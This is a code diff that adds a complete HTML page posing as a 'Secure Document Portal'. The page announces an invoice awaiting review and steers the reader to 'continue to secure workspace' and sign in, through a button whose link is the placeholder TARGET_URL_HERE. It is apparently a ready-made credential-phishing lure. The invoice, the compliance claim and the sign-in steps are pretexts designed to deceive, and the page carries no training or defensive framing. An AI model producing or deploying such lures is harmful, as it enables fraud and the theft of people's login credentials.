@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="robots" content="noindex,nofollow" />
+  <title>Secure Document Portal</title>
+  <style>
+    body { margin:0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; background:#0b1220; color:#e8eefc; }
+    .wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px; }
+    .card { width: min(720px, 100%); background:#111a2e; border:1px solid rgba(255,255,255,.08); border-radius:16px; padding:28px; box-shadow: 0 10px 30px rgba(0,0,0,.35); }
+    .badge { display:inline-block; font-size:12px; letter-spacing:.02em; padding:6px 10px; border-radius:999px; background: rgba(99, 179, 237, .15); border: 1px solid rgba(99, 179, 237, .35); color:#bfe3ff; }
+    h1 { margin:14px 0 6px; font-size:22px; }
+    p { margin:8px 0; color: rgba(232,238,252,.85); line-height:1.55; }
+    .box { margin-top:16px; padding:14px 16px; border-radius:12px; background: rgba(255,255,255,.04); border: 1px solid rgba(255,255,255,.08); }
+    .btn { margin-top:18px; display:inline-flex; gap:10px; align-items:center; justify-content:center; padding:12px 16px; border-radius:12px;
+           background:#2b6cb0; color:white; text-decoration:none; font-weight:600; border:1px solid rgba(255,255,255,.15); }
+    .btn:hover { filter: brightness(1.06); }
+    .muted { font-size:12px; color: rgba(232,238,252,.65); margin-top:14px; }
+    .row { display:flex; flex-wrap:wrap; gap:10px; margin-top:10px; }
+    .pill { font-size:12px; padding:6px 10px; border-radius:999px; background: rgba(255,255,255,.05); border:1px solid rgba(255,255,255,.08); color: rgba(232,238,252,.8); }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <span class="badge">Secure Document Portal</span>
+      <h1>Invoice #48219 – Review Required</h1>
+      <p>The document is stored in a secure workspace due to compliance requirements.</p>
+
+      <div class="box">
+        <p><strong>What to do:</strong></p>
+        <div class="row">
+          <span class="pill">1) Continue to secure workspace</span>
+          <span class="pill">2) Sign in if prompted</span>
+          <span class="pill">3) Review the document</span>
+        </div>
+      </div>
+
+      <a class="btn" href="TARGET_URL_HERE">Continue to secure workspace</a>
+
+      <p class="muted">Note: Access may require authentication and multi-factor verification.</p>
+    </div>
+  </div>
+</body>
+</html>
